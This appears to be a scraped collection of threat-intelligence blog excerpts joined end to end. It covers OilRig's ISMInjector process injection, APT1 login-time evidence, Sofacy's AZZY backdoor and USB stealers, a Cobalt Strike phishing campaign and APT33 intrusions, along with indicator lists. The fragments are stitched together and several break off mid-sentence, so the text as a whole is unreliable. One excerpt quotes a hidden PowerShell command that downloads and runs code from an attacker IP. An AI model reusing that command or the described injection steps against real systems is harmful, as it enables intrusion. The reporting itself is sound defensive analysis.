embedded ISMAgent payload into another process. The two modules, which we will refer to as Joiner and Inner, have the following debug paths, which suggest the author of these modules refer to this Trojan as “Agent Injector”:\\nC:\\\\Users\\\\J-Win-10\\\\Desktop\\\\Agent Injector\\\\PolicyConverter\\\\Inner\\\\obj\\\\Release\\\\Inner.pdb\\nC:\\\\Users\\\\J-Win-10\\\\Desktop\\\\Agent Injector\\\\PolicyConverter\\\\Joiner\\\\obj\\\\Release\\\\Joiner.pdb\\nThe main function within the ISMInjector assembly uses the Joiner module to construct the final payload and the Inner module to inject the final payload into a process. Figure 4 shows the ISMInjector’s main function that uses the two modules to carry out its injection process before exiting.\\nFigure 4 ISMInjector’s main function uses methods within the Joiner and Inner modules\\nThe Joiner module contains four resources named P11, P12, P21 and P22, which are all 35840 bytes of binary data. It reads the P11 and P12 resources and saves them to a variable, effectively concatenating them together. The module uses the same logic to concatenate the P21 and P22 resources together, and finally concatenates the P11+P12 variable with the P21+P22 variable, which results in the construction of a binary executable.\\nThe ISMInjector code then calls the “LoadDll” method within the Inner module, providing the string “Run”, the payload constructed by the Joiner module, and a path to the “RegAsm.exe” executable as arguments, as seen in Figure 4.\\nThe LoadDLL method constructs an embedded assembly, using the same method as the Joiner module used to construct the final payload. However, the Inner module creates another module that is used to actually perform the code injection. To create this embedded module, the Inner module references two resources named D1 and D2 and concatenates them together. The resulting .NET assembly has a class called “ClsV2” that has a method named “Run”, which is called in the LoadDll function call shown in Figure 4. The “Run” method within the “ClsV2” class is invoked to execute the payload.\\nThe “Run” method calls functions that has a state machine that dictates the actions taken. At a high level, these state machines attempt to create a process and inject the constructed payload into the newly created process. The use of state machines complicates analysis efforts because it makes the flow of execution jump around in a non-sequential fashion.\\nTable 2 contains the path through the state machines that ISMInjector uses to create a remote process, inject its embedded payload then run the payload. Each row of the table contains the current state, a description of the activities performed within that state, as well as the next state that will be set and run. The state values jump around dramatically, which requires an analyst to also jump around the code to determine its functionality. This is an interesting anti-analysis technique we have not seen the OilRig actors use in their other tools.\\nState\\nDescription\\nNext\\nState\\n19\\nInitializes array\\n10\\n10\\nInitializes array\\n6\\n6\\nInitializes array\\n3\\n3\\nInitializes array\\n14\\n14\\nInitializes array\\n15\\n15\\nInitializes array\\n16\\n16\\nInitializes array\\n12\\n12\\nInitializes array\\n18\\n18\\nInitializes array\\n8\\n8\\nInitializes array\\n25\\n25\\nInitializes array\\n1\\n1\\nInitializes array\\n4\\n4\\nResolves the CreateProcessA function\\n21\\n21\\nResolves the SetThreadContext function\\n26\\n26\\nResolves the GetThreadContext function\\n17\\n17\\nResolves the ReadProcessMemory function\\n27\\n27\\nResolves the WriteProcessMemory function\\n24\\n24\\nResolves the NtUnmapViewOfSection function\\n7\\n7\\nResolves the VirtualAllocEx function\\n0\\n0\\nResolves the ResumeThread function\\n23\\n23\\nFormats a text string as “{0}”, which is the path to the “RegAsm.exe” executable\\n5\\n5\\nInstantiates a STARTUPINFO structure\\n22\\n22\\nInstantiates a PROCESS_INFORMATION structure\\n11\\n11\\nSets the size (cb field) of the STARTUPINFO structure\\n20\\n20\\nEnters another state machine to handle the execution of a process\\n29\\nEnter sub-state machine\\n7\\nConcatenates the path to the “RegAsm.exe” with a space and a second string, which in this sample is empty\\n37\\n37\\nCalls the CreateProcessA function using the concatenated string created in previous state.

This ISMAgent payload is configured to use “cdnmsnupdate[.]com” as its C2 server using both HTTP and DNS tunneling channels.\\nIt appears the OilRig group may have simply repurposed the injection code from an open source file called DynamicCallRunPE.cs, which is available on GitHub and Codegists.\\xa0 The actors did not use this code without modification; instead, they used state machines as an obfuscation technique to disguise the injection code.\\nThe path that ISMInjector takes through the state machine and the activities are almost identical to the activities carried out in the DynamicCallRunPE.cs code. It is also possible that this portion of the ISMInjector was obfuscated by a crypter that the threat actors used to further complicate analysis.\\nInfrastructure\\nBeginning with the initial phishing email, we discovered a significant infrastructure for this attack wave that also showed relationships to previous Oilrig attack campaigns both from an infrastructure perspective and shared code.\\nMuch like previous Oilrig attacks, the C2 domains used typo-squatting techniques in order to attempt to evade detection. The image embedded within the phishing email is hosted on cdnakamaiplanet[.]com, which resolves to 82.102.14.216. As with other OilRig attacks, this IP is not reused to resolve to any other domain. However, two other IPs on the same /24 netblock are found to be used as C2s. 82.102.14.222 is found to resolve to Microsoft-publisher[.]com, which we observed as a C2 for our initial ISMAgent finding. 82.102.14.246 resolves to adpolioe[.]com, hich appears to be a typo-squatted domain that also hosts a sample of ISMAgent at hxxp://82.102.14[.]246/webdav/aws.exe. This sample’s C2 is cdnmsnupdate[.]com which turns out to be the C2 server for three other samples, one ISMAgent and two of them being ISMAgentInjector. Reverse resolution of this domain provides us the IP 74.91.19.122, which again is not used for any other domain resolution. Another IP on the same /24 is found at 74.91.19.108 resolving to msoffice365update[.]com which happens to be the C2 domain for the ISMAgent payload delivered by the malicious document exploiting CVE-2017-1099 mentioned earlier in this blog.\\nAs previously discussed, the .dot file attempting to exploit CVE-2017-0199 uses msoffice-cdn[.]com as a C2 to retrieve additional malicious code. Reverse resolution of this domain shows an IP of 185.162.235.121, which shares a /24 netblock with 185.162.235.29. This IP resolves to office365-management[.]com which is the C2 for a secondary .dot file we were able to collect in this attack wave. In figure 5 below you can see the OilRig infrastructure for ISMInjector that our research uncovered.\\nFigure 5 OilRig infrastructure for ISMInjector\\nConclusion\\nThe OilRig group continues to target organizations in the Middle East, in this instance targeting the government of the United Arab Emirates. They continue to use the ISMAgent Trojan as the final payload in their attacks, this time in conjunction with a custom injector Trojan to assist with delivery and execution. The injector Trojan was obfuscated using a known crypter and used state-machines as an anti-analysis technique to complicate its process to inject the payload into another process. The use of crypters and anti-analysis techniques suggests that the threat actors are increasing their efforts to evade security products to successfully compromise its targets.\\nAs our research continues to expand into the OilRig group, we are continuously discovering new infrastructure which directly overlaps with previously used infrastructure. With the addition of the reuse of tools, similar attack protocols, as well as consistent victimology, we have strong confidence that the original OilRig attack campaign is indeed a single, unique, and previously unknown threat group that will hereby be referred to as the OilRig group.\\nPalo Alto Networks customers are protected from ISMInjector, ISMAgent and ThreeDollars by the following:\\nAll ISMInjector, ISMAgent and ThreeDollars samples are marked with a malicious verdict in WildFire\\nAutoFocus customers can track these malware families via:\\nISMInjector\\nISMAgent\\nThreeDollars\\nIndicators of Compromise\\nThreeDollars SHA256\\n119c64a8b35bd626b3ea5f630d533b2e0e7852a4c59694125ff08f9965b5f9cc\\nISMInjector SHA256\\n33c187cfd9e3b68c3089c27ac64a519ccc951ccb3c74d75179c520f54f11f647\\nISMAgent SHA256\\n74f61b6ff0eb58d76f4cacfb1504cb6b72684d0d0980d42cba364c6ef28223a8\\nISMAgent C2\\ncdnmsnupdate[.]com\\nRelated CVE-2017-0199 SHA256\\n66358a295b8b551819e053f2ee072678605a5f2419c1c486e454ab476c40ed6a\\nRelated CVE-2017-0199 Domains\\nmsoffice-cdn[.]com\\noffice365-management[.]com\\nAdditional Hashes\\nf92ab374edd488d85f2e113b40ea8cb8baf993f5c93c12455613ad3265f42b17 (CVE-2017-0199)\\nfcad263d0fe2b418db05f47d4036f0b42aaf201c9b91281dfdcb3201b298e4f4 (ISMInjector)\\n0ccb2117c34e3045a4d2c0d193f1963c8c0e8566617ed0a561546c932d1a5c0c (ThreeDollars)\\na9f1375da973b229eb649dc3c07484ae7513032b79665efe78c0e55a6e716821 (ISMAgent)\\n963f93824d87a56fe91283652eab5841e2ec538c207091dbc9606b962e38805d (ISMAgent)\\nAdditional Domains\\nntpupdateserver[.]com\\ncdnakamaiplanet[.]com\\nmsoffice365update[.]com\\nadpolioe[.]com\\nMicrosoft-publisher[.]com\\nGet updates from\\nPalo Alto Networks!\\nSign up to receive the latest news, cyber threat intelligence and research from us\\nPlease enter your email address!\\nPlease mark, I\\'m not a robot!\\nBy submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.\\nPopular ResourcesResource Center\\nBlog\\nCommunities\\nTech Docs\\nUnit 42\\nSitemap\\nLegal NoticesPrivacy\\nTerms of Use\\nDocuments\\nAccountManage Subscriptions\\nReport a Vulnerability\\n© 2020 Palo Alto Networks, Inc.

At the time it was originally released, China denounced the report, saying that it lacked sufficient evidence. Following the DOJ’s indictment, however, China’s usual response changed from “you lack sufficient evidence” to “you have fabricated the evidence”, calling on the U.S. to “correct the error immediately.” This is a significant evolution in China’s messaging; if the evidence is real, it overwhelmingly demonstrates China\\'s unilateral attempts to leapfrog years of industrial development -- by using cyber intrusions to access and steal intellectual property.The evidence provided in the indictment includes Exhibit F (pages 54-56), which shows three charts based on Dynamic DNS data. These charts indicate that the named defendants (Unit 61398 members) were re-pointing their domain names at a Dynamic DNS provider during Chinese business hours from 2008 to 2013. The China work day, particularly for government offices, is very predictable, as noted on this travel site:\"Government offices, institutions and schools begin at 8:00 or 8:30, and end at 17:00 or 17:30 with two-hour noon break, from Monday to Friday. They usually close on Saturday, Sunday and public holidays.\"What Exhibit F shows is a spike of activity on Monday through Friday around 8am in Shanghai (China Standard Time), a roughly 2-hour lull at lunchtime, and then another spike of activity from about 2pm to 6pm. The charts also show that there were very few changes in Dynamic DNS resolution on weekends.At Mandiant (now a FireEye company), we can corroborate the DOJ’s data by releasing additional evidence that we did not include in the APT1 report. In the APT1 report, we specified the following:Over a two-year period (January 2011 to January 2013) we confirmed 1,905 instances of APT1 actors logging into their hop infrastructure from 832 different IP addresses with Remote Desktop.Of the 832 IP addresses, 817 (98.2%) were Chinese and belong predominantly to four large net blocks in Shanghai which we will refer to as APT1’s home networks.In order to make a user’s experience as seamless as possible, the Remote Desktop protocol requires client applications to forward several important details to the server, including their client hostname and the client keyboard layout. In 1,849 of the 1,905 (97%) APT1 Remote Desktop sessions we observed in the past two years, the keyboard layout setting was “Chinese (Simplified) — US Keyboard.”One thing we did not originally provide was an analysis of the time of day and day of week that these 1,905 Remote Desktop (RDP) connections occurred. However, when we look at these connections in bar chart format, obvious patterns appear:Figure 1: APT1 Remote Desktop login times distributed by hour of day (China Standard Time)\\xa0Figure 2: APT1 Remote Desktop login times distributed by day of week (China Standard Time)Essentially, APT1 conducted almost all of the 1,905 RDP connections from 2011 to 2013:(1) On week days (Monday through Friday),(2) between 8am and noon, 2pm and 6pm, and 7pm and 10pm CST.On some occasions, APT1 personnel appear to have worked on weekends, but these are minor exceptions to the norm. Consider the following evidence together for the 1,905 RDP connections:98.2% of IP addresses used to log in to hop points (which help mask the real point of origin to victim organizations) were from Shanghai networks97% of the connections were from computers using the Simplified Chinese language setting97.5% of the connections occurred on weekdays, China Standard Time98.8% of the connections occurred between 7am and midnight China Standard Time75% occurred between 8am to noon or between 2pm to 6pm15% occurred between 7pm and 10pmThe simplest conclusion based on these facts is that APT1 is operating in China, and most likely in Shanghai. Although one could attempt to explain every piece of evidence away, at some point the evidence starts to become overwhelming when it is all pointing in one direction. Our timestamp data, derived from active RDP logins over a two year period, matches the DOJ’s timestamp data, derived from a different source -- active Dynamic DNS re-pointing over a five year period. These data sets show that APT1 is either operating in China during normal Chinese business hours or that APT1 is intentionally going to painstaking lengths to look like they are.\\xa0 The data used to produce the charts above are archived in raw format and we are confident that any computer networking expert would certify them as genuine and non-fabricated in a court of law. But, that isn’t really the issue. The real issue is: will this activity continue and for how long? Regardless, FireEye remains focused on how these threats evolve over time, in order to reduce the time from “detect” to “fix”, as these and other actors continue targeting potential victims.\\nPrevious Post\\nNext Post\\nPromotion\\nSubscribe\\nShare\\nRecent\\nRSS\\nEmail UpdatesInformation and insight on today\\'s advanced threats from FireEye.\\nShare\\nRecent Posts\\n28 Apr 2020Excelerating Analysis, Part 2 — X[LOOKUP] Gon’ Pivot To Ya\\n27 Apr 2020Putting the Model to Work: Enabling Defenders With Vulnerability\\nIntelligence — Intelligence for Vulnerability Management, Part Four\\n22 Apr 2020Vietnamese Threat Actors APT32 Targeting Wuhan Government and Chinese\\nMinistry of Emergency Management in Latest Example of COVID-19 Related Espionage\\nRSS Feed: Stay Connected\\nCompany\\nWhy FireEye?\\nCustomer Stories\\nCareers\\nCertifications and Compliance\\nInvestor Relations\\nSupplier Documents\\nNews and Events\\nNewsroom\\nPress Releases\\nWebinars\\nEvents\\nAwards and Honors\\nEmail Preferences\\nTechnical Support\\nIncident?\\nReport Security Issue\\nContact Support\\nCustomer Portal\\nCommunities\\nDocumentation Portal\\nFireEye Blogs\\nThreat Research\\nFireEye Stories\\nIndustry Perspectives\\nThreat Map\\nView the Latest Threats\\nContact Us\\n+1 877-347-3393\\nStay Connected\\nLinkedIn\\nTwitter\\nFacebook\\nYouTube\\nPodcast\\nCette page est également disponible en français.\\nVersion française\\nDiese Seite ist auch auf Deutsch verfügbar\\nZur deutschen Seite wechseln\\n日本語ページを\\n見る\\n해당 페이지는 한글 버전으로 보실 수 있습니다\\n바로 가기\\nContinue viewing this page in English\\nCopyright\\xa0©\\xa02020\\xa0FireEye, Inc.\\xa0All rights reserved.\\xa0Privacy & Cookies Policy | Privacy Shield | Legal Documentation\\nSite Language\\nEnglish\\nMy preferred language:\\nEnglish (English)\\nFrench (Français)\\nGerman (Deutsch)\\nJapanese (日本語)\\nKorean (한국어)\\nMore languages',\n",

10:59 am\\nSofacy (also known as “Fancy Bear”, “Sednit”, “STRONTIUM” and “APT28”) is an advanced threat group that has been active since around 2008, targeting mostly military and government entities worldwide, with a focus on NATO countries.\\nMore recently, we have also seen an increase in activity targeting Ukraine.\\nBack in 2011-2012, the group used a relatively tiny implant (known as “Sofacy” or SOURFACE) as its first stage malware. The implant shared certain similarities with the old Miniduke implants. This led us to believe the two groups were connected, at least to begin with, although it appears they parted ways in 2014, with the original Miniduke group switching to the CosmicDuke implant.\\nAt some point during 2013, the Sofacy group expanded its arsenal and added more backdoors and tools, including CORESHELL, SPLM (aka Xagent, aka CHOPSTICK), JHUHUGIT (which is built with code from the Carberp sources), AZZY (aka ADVSTORESHELL, NETUI, EVILTOSS, and spans across four to five generations) and a few others. We’ve seen quite a few versions of these implants and they were relatively widespread for a time.\\n#Sofacy group has been active since 2008, targeting mostly military and government entities in NATO countriesTweet\\nEarlier this year, we noticed a new release of the AZZY implant which, at the time, was largely undetected by anti-malware products. We observed several waves of attacks using this version, most recently in October. The new waves of attacks also included a new generation of USB stealers deployed by the Sofacy actor, with the first versions dating back to February 2015, and which appear to be geared exclusively towards high profile targets.\\nSofacy’s August 2015 attack wave\\nIn the months leading up to August, the Sofacy group launched several waves of attacks relying on zero-day exploits in Microsoft Office, Oracle Sun Java, Adobe Flash Player and Windows itself. For instance, its JHUHUGIT implant was delivered through a Flash zero-day and used a Windows EoP exploit to break out of the sandbox. The JHUHUGIT implant became a relatively popular first stage for the Sofacy attacks and was used again with a Java zero-day (CVE-2015-2590) in July 2015.\\nWhile the JHUHUGIT (and more recently, “JKEYSKW”) implant used in most of the Sofacy attacks, high profile victims are being targeted with another first level implant, representing the latest evolution of their AZZYTrojan.\\nTwo recurring characteristics of the #Sofacy group are speed and the use of multi-backdoor packagesTweet\\nThe first versions of the new AZZY implant appeared in August of this year. During a high profile incident we investigated, our products successfully detected and blocked a “standard” Sofacy “AZZY” sample that was used to target a range of defense contractors. The sample used in this attack (md5 A96F4B8AC7AA9DBF4624424B7602D4F7, compiled July 29th, 2015) was a pretty standard Sofacy x64 AZZY implant, which has the internal name “advshellstore.dll”.\\nInterestingly, the fact that the attack was blocked didn’t appear to stop the Sofacy team. Just an hour and a half later they had compiled and delivered another AZZY x64 backdoor (md5: 9D2F9E19DB8C20DC0D20D50869C7A373, compiled August 4th, 2015). This was no longer detectable with static signatures by our product. However, it was detected dynamically by the host intrusion prevention subsystem when it appeared in the system and was executed.\\nThis recurring, blindingly-fast Sofacy attack attracted our attention as neither sample was delivered through a zero-day vulnerability — instead, they appeared to be downloaded and installed by another malware. This separate malware was installed by an unknown attack as “AppData\\\\Local\\\\Microsoft\\\\Windows\\\\msdeltemp.dll” (md5: CE8B99DF8642C065B6AF43FDE1F786A3).\\nThe top level malware, CE8B99DF8642C065B6AF43FDE1F786A3 (named by its authors “msdeltemp.dll” according to internal strings, and compiled July 28th, 2015) is a rare type of the Sofacy AZZY implant.\\nIt has been modified to drop a separate C&C helper, (md5: 8C4D896957C36EC4ABEB07B2802268B9) as “tf394kv.dll“.\\nThe dropped “tf394kv.dll” file is an external C&C communications library, compiled on July 24th, 2015 and used by the main backdoor for all Internet-based communications.\\nDecrypted configuration block of the C&C helper library “tf394kv.dll“\\nThis code modification marks an unusual departure from the typical AZZY backdoors, with its C&C communication functions moved to an external DLL file. In the past, the Sofacy developers modified earlier AZZY backdoors to use a C&C server encoded in the registry, instead of storing it in the malware itself, so this code modularisation follows the same line of thinking.\\nIn addition to the new AZZY backdoors with side-DLL for C&C, we observed a new set of data-theft modules deployed against victims by the Sofacy group. Among the most popular modern defense mechanisms against APTs are air-gaps — isolated network segments without Internet access, where sensitive data is stored. In the past, we’ve seen groups such as Equation and Flame use malware to steal data from air-gapped networks. The Sofacy group uses such tools as well.\\nThe first versions of these new USB stealer modules appeared around February 2015 and the latest appear to have been compiled in May 2015. Older versions of these USBSTEALER modules were previously described by our colleagues from ESET.\\nOne example of the new Sofacy USBSTEALER modules is 8b238931a7f64fddcad3057a96855f6c, which is named internally as msdetltemp.dll.\\nThis data theft module appears to have been compiled in May 2015 and is designed to watch removable drives and collect files from them, depending on a set of rules defined by the attackers. The stolen data is copied into a hidden directory as “%MYPICTURES%\\\\%volume serial number%“, from where it can be exfiltrated by the attackers using one of the AZZY implants. More details on the new USB stealers are available in the section on technical analysis.\\nConclusions\\nOver the last year, the Sofacy group has increased its activity almost tenfold when compared to previous years, becoming one of the most prolific, agile and dynamic threat actors in the arena. This activity spiked in July 2015, when the group dropped two completely new exploits, an Office and Java zero-day.\\nAt the beginning of August, Sofacy began a new wave of attacks, focusing on\\ndefense-related targets. As of November 2015, this wave of attacks is ongoing. The attackers deploy a rare modification of the AZZY backdoor, which is used for the initial reconnaissance. Once a foothold is established, they try to upload more backdoors, USB stealers as well as other hacking tools such as “Mimikatz” for lateral movement.\\nOver the last year, the #Sofacy group has increased its activity almost tenfold, that spiked in July 2015Tweet\\nTwo recurring characteristics of the Sofacy group that we keep seeing in its attacks are speed and the use of multi-backdoor packages for extreme resilience. In the past, the group used droppers that installed both the SPLM and AZZY backdoors on the same machine. If one of them was detected, the other one provided the attacker with continued access.\\nAs usual, the best defense against targeted attacks is a multi-layered approach. Combine traditional anti-malware technologies with patch management, host intrusion detection and, ideally, whitelisting and default-deny strategies. According to a study by the Australian DSD, 85% of the targeted attacks analysed could have been stopped by four simple defense strategies. While it’s impossible to achieve 100% protection, in practice and most cases all you have to do is increase your defenses to the point where it becomes too expensive for the attacker – who will just give up and move on to other targets.\\nMore information about the Sofacy group is available to customers of Kaspersky Intelligent Services.\\nIs there a ‘silver bullet’ to protect yourself against Sofacy?

In addition to that, API function names are reversed, presumably to avoid detection in memory.\\nOnce started, the code in the main thread resolves the basic API functions it needs and loads an additional library from the following location: “%TEMP%\\\\tf394kv.dll”.

For every disk it creates a “stash” directory in “%root stash directory location%\\\\%volume serial number in hex%” with attributes FILE_ATTRIBUTE_HIDDEN and FILE_ATTRIBUTE_SYSTEM.

In December they were already setting up for their next campaign. Today, on January 16th, the first wave of spear phishing emails were delivered to the inboxes of Russian banks. Sadly, this time around, the group didn’t forget to BCC.\\nThe emails were sent in the name of a large European bank in an attempt to social engineer the receiver into trusting the email. The emails were quite plain with only a single question in the body and an attachment with the name once.rtf. In other cases, we saw a file with the name Заявление.rtf attached to an email that was also written in Russian:\\nFig-1 Example of spear phishing email\\nThe emails were sent from addresses on the domains bankosantantder.com and billing-cbr.ru, which were both set up for this campaign specifically.\\nAnalysis\\nThe attachment abuses CVE-2017-11882 to start PowerShell with the following command:\\npowershell -nop -w hidden -c “IEX ((new-object net.webclient).downloadstring(‘http://46.21.147.61:80/a’))”\\nThis command downloads and executes a second stage, which is also a PowerShell script, but encoded:\\nFig-2 Second stage\\nThis script decodes to the third stage of the attack, another PowerShell script. This stage-three script is used to load a small piece of embedded shellcode into memory and run it like so:\\nFig-3 Stage-three script\\nThe shellcode starts the Cobalt Strike stager in a new threat and starts it up. This stager will initiate connectivity with the C2 server to install the Cobalt Strike implant.\\nInfrastructure\\nAs shown, the stager beacons out to helpdesk-oracle.com, which was registered by a person using the email address krystianwalczak@yandex.com. This email address pointed us to another domain, which was registered on the same date and follows a similar pattern:\\nFig-4 WHOIS information for the malicious email addresses\\nRight now, the server to which the domain help-desc-me.com points doesn’t seem to be active, nor have we seen any malicious samples connect to it.

APT39 has prioritized\\nthe telecommunications sector, with additional targeting of the travel\\nindustry and IT firms that support it and the high-tech industry.\\nOverview: The group's focus on the telecommunications and\\ntravel industries suggests intent to perform monitoring, tracking, or\\nsurveillance operations against specific individuals, collect\\nproprietary or customer data for commercial or operational purposes\\nthat serve strategic requirements related to national priorities, or\\ncreate additional accesses and vectors to facilitate future campaigns.\\nGovernment entities targeting suggests a potential secondary intent to\\ncollect geopolitical data that may benefit nation-state decision making.\\nAssociated malware: The group primarily leverages the SEAWEED\\nand CACHEMONEY backdoors along with a specific variant of the POWBAT backdoor.\\nAttack vectors: For initial compromise FireEye Intelligence has\\nobserved APT39 leverage spearphishing with malicious attachments\\nand/or hyperlinks typically resulting in a POWBAT infection. In some\\ncases previously compromised email accounts have also been leveraged,\\nlikely to abuse inherent trusts and increase the chances of a\\nsuccessful attack. APT39 frequently registers and leverages domains\\nthat masquerade as legitimate web services and organizations that are\\nrelevant to the intended target. Furthermore, this group has routinely\\nidentified and exploited vulnerable web servers of targeted\\norganizations to install web shells, such as ANTAK and ASPXSPY, and\\nused stolen legitimate credentials to compromise externally facing\\nOutlook Web Access (OWA) resources.

The group’s\\nespionage campaigns have targeted healthcare, telecoms, and the\\nhigh-tech sector, and have historically included stealing intellectual\\nproperty. Their cyber crime intrusions are most apparent among video\\ngame industry targeting, including the manipulation of virtual\\ncurrencies, and attempted deployment of ransomware. APT41operations\\nagainst higher education, travel services, and news/media firms\\nprovide some indication that the group also tracks individuals and\\nconducts surveillance.\\nOverview: APT41 is a prolific cyber threat group that carries\\nout Chinese state-sponsored espionage activity in addition to\\nfinancially motivated activity potentially outside of state control.\\nAssociated malware: APT41 has been observed using at least 46\\ndifferent code families and tools.\\nAttack vectors: APT41 often relies on spear-phishing emails\\nwith attachments such as compiled HTML (.chm) files to initially\\ncompromise their victims. Once in a victim organization, APT41 can\\nleverage more sophisticated TTPs and deploy additional malware. For\\nexample, in a campaign running almost a year, APT41 compromised\\nhundreds of systems and used close to 150 unique pieces of malware\\nincluding backdoors, credential stealers, keyloggers, and rootkits.\\nAPT41 has also deployed rootkits and Master Boot Record (MBR) bootkits\\non a limited basis to hide their malware and maintain persistence on\\nselect victim systems.\\nBack to top ▵\\nAdditional resources\\nReport – APT41: A Dual Espionage and Cyber Crime Operation\\nBlog – APT41, A Dual Espionage and Cyber Crime Threat\\nWebinar – Double Dragon: APT41, a Dual Espionage and Cyber Crime Operation\\nAPT40\\nSuspected attribution: China\\nTarget sectors: APT40 is a Chinese cyber espionage group that\\ntypically targets countries strategically important to the Belt and\\nRoad Initiative. Although the group targets global organizations —\\nespecially those with a focus on engineering and defense — it also\\nhistorically conducted campaigns against regional entities in areas\\nsuch as Southeast Asia. Since at least January 2013, the group has\\nconducted campaigns against a range of verticals including maritime\\ntargets, defense, aviation, chemicals, research/education, government,\\nand technology organizations.\\nOverview: FireEye Intelligence believes that APT40's operations\\nare a cyber counterpart to China's efforts to modernize its naval\\ncapabilities; this is also manifested in targeting wide-scale research\\nprojects at universities and obtaining designs for marine equipment\\nand vehicles. The group's operations tend to target\\ngovernment-sponsored projects and take large amounts of information\\nspecific to such projects, including proposals, meetings, financial\\ndata, shipping information, plans and drawings, and raw data.\\nAssociated malware: APT40 has been observed using at least 51\\ndifferent code families. Of these, 37 are non-public. At least seven\\nof these non-public tools (BADSIGN, FIELDGOAL, FINDLOCK, PHOTO,\\nSCANBOX, SOGU, and WIDETONE) are shared with other suspected\\nChina-nexus operators.\\nAttack vectors: APT40 typically poses as a prominent individual\\nwho is probably of interest to a target to send spear-phishing emails.\\nThis includes pretending to be a journalist, an individual from a\\ntrade publication, or someone from a relevant military organization or\\nnon-governmental organization (NGO).

They have historically targeted construction\\nand engineering, aerospace, and telecom firms, and governments in the\\nUnited States, Europe, and Japan. We believe that the targeting of\\nthese industries has been in support of Chinese national security\\ngoals, including acquiring valuable military and intelligence\\ninformation as well as the theft of confidential business data to\\nsupport Chinese corporations.\\nAssociated malware: HAYMAKER, SNUGRIDE, BUGJUICE, QUASARRAT\\nAttack vectors: This recent APT10 activity has included both\\ntraditional spear phishing and access to victim’s networks through\\nmanaged service providers. (For more information on infection via\\nservice providers see M-Trends 2016). APT10 spear phishes have been\\nrelatively unsophisticated, leveraging .lnk files within archives,\\nfiles with double extensions (e.g.\\n[Redacted]_Group_Meeting_Document_20170222_doc_.exe) and in some cases\\nsimply identically named decoy documents and malicious launchers\\nwithin the same archive.

The malware and tradecraft in this\\nblog post are\\xa0consistent with the\\xa0June\\n2019 intrusion campaign\\xa0targeting U.S. federal government\\nagencies and financial, retail, media, and education sectors\\xa0– as\\nwell as\\xa0U.S.\\nCyber Command\\'s July 2019 CVE-2017-11774 indicators, which\\nFireEye also attributes to APT33.\\xa0FireEye\\'s rigorous process for\\nclustering and attributing this activity is also explored in this\\nblog\\'s \"Identifying the Overlap\" section.\\nIntroduction\\nFireEye assesses APT33 may be behind a series of intrusions and attempted intrusions within the engineering industry. Public reporting indicates this activity may be related to recent destructive attacks. FireEye\\'s Managed Defense has responded to and contained numerous intrusions that we assess are related. The actor is leveraging publicly available tools in early phases of the intrusion; however, we have observed them transition to custom implants in later stage activity in an attempt to circumvent our detection.\\nOn Sept. 20, 2017, FireEye Intelligence published a blog post detailing spear phishing activity targeting Energy and Aerospace industries. Recent public reporting indicated possible links between the confirmed APT33 spear phishing and destructive SHAMOON attacks; however, we were unable to independently verify this claim. FireEye’s Advanced Practices team leverages telemetry and aggressive proactive operations to maintain visibility of APT33 and their attempted intrusions against our customers. These efforts enabled us to establish an operational timeline that was consistent with multiple intrusions Managed Defense identified and contained prior to the actor completing their mission. We correlated the intrusions using an internally-developed similarity engine described below. Additionally, public discussions have also indicated that specific attacker infrastructure we observed is possibly related to the recent destructive SHAMOON attacks.\\n45 days ago, during 24x7 monitoring, #ManagedDefense detected & contained an attempted intrusion from newly-identified adversary infrastructure*.It is C2 for a code family we track as POWERTON.*hxxps://103.236.149[.]100/api/info— FireEye (@FireEye) December 15, 2018\\nIdentifying the Overlap in Threat Activity\\nFireEye augments our expertise with an internally-developed similarity engine to evaluate potential associations and relationships between groups and activity. Using concepts from document clustering and topic modeling literature, this engine provides a framework to calculate and discover similarities between groups of activities, and then develop investigative leads for follow-on analysis. Our engine identified similarities between a series of intrusions within the engineering industry. The near real-time results led to an in-depth comparative analysis. FireEye analyzed all available organic information from numerous intrusions and all known APT33 activity. We subsequently concluded, with medium confidence, that two specific early-phase intrusions were the work of a single group. Advanced Practices then reconstructed an operational timeline based on confirmed APT33 activity observed in the last year. We compared that to the timeline of the contained intrusions and determined there were circumstantial overlaps to include remarkable similarities in tool selection during specified timeframes. We assess with low confidence that the intrusions were conducted by APT33. This blog contains original source material only, whereas Finished Intelligence including an all-source analysis is available within our intelligence portal. To best understand the techniques employed by the adversary, it is necessary to provide background on our Managed Defense response to this activity during their 24x7 monitoring.\\nManaged Defense Rapid Responses: Investigating the Attacker\\nIn mid-November 2017, Managed Defense identified and responded to targeted threat activity at a customer within the engineering industry. The adversary leveraged stolen credentials and a publicly available tool, SensePost’s RULER, to configure a client-side mail rule crafted to download and execute a malicious payload from an adversary-controlled WebDAV server 85.206.161[.][email\\xa0protected]\\\\outlook\\\\live.exe (MD5: 95f3bea43338addc1ad951cd2d42eb6f).\\nThe payload was an AutoIT downloader that retrieved and executed additional PowerShell from hxxps://85.206.161[.]216:8080/HomePage.htm. The follow-on PowerShell profiled the target system’s architecture, downloaded the appropriate variant of PowerSploit (MD5: c326f156657d1c41a9c387415bf779d4 or 0564706ec38d15e981f71eaf474d0ab8), and reflectively loaded PUPYRAT (MD5: 94cd86a0a4d747472c2b3f1bc3279d77 or 17587668AC577FCE0B278420B8EB72AC). The actor leveraged a publicly available exploit for CVE-2017-0213 to escalate privileges, publicly available Windows SysInternals PROCDUMP to dump the LSASS process, and publicly available MIMIKATZ to presumably steal additional credentials. Managed Defense aided the victim in containing the intrusion.\\nFireEye collected 168 PUPYRAT samples for a comparison. While import hashes (IMPHASH) are insufficient for attribution, we found it remarkable that out of the specified sampling, the actor’s IMPHASH was found in only six samples, two of which were confirmed to belong to the threat actor observed in Managed Defense, and one which is attributed to APT33. We also determined APT33 likely transitioned from PowerShell EMPIRE to PUPYRAT during this timeframe.\\nIn mid-July of 2018, Managed Defense identified similar targeted threat activity focused against the same industry. The actor leveraged stolen credentials and RULER’s module that exploits CVE-2017-11774 (RULER.HOMEPAGE), modifying numerous users’ Outlook client homepages for code execution and persistence. These methods are further explored in this post in the \"RULER In-The-Wild\" section.\\nThe actor leveraged this persistence mechanism to download and execute OS-dependent variants of the publicly available .NET POSHC2 backdoor as well as a newly identified PowerShell-based implant self-named POWERTON. Managed Defense rapidly engaged and successfully contained the intrusion. Of note, Advanced Practices separately established that APT33 began using POSHC2 as of at least July 2, 2018, and continued to use it throughout the duration of 2018.\\nDuring the July activity, Managed Defense observed three variations of the homepage exploit hosted at hxxp://91.235.116[.]212/index.html. One example is shown in Figure 1.\\nFigure 1: Attacker’s homepage exploit (CVE-2017-11774)\\nThe main encoded payload within each exploit leveraged WMIC to conduct system profiling in order to determine the appropriate OS-dependent POSHC2 implant and dropped to disk a PowerShell 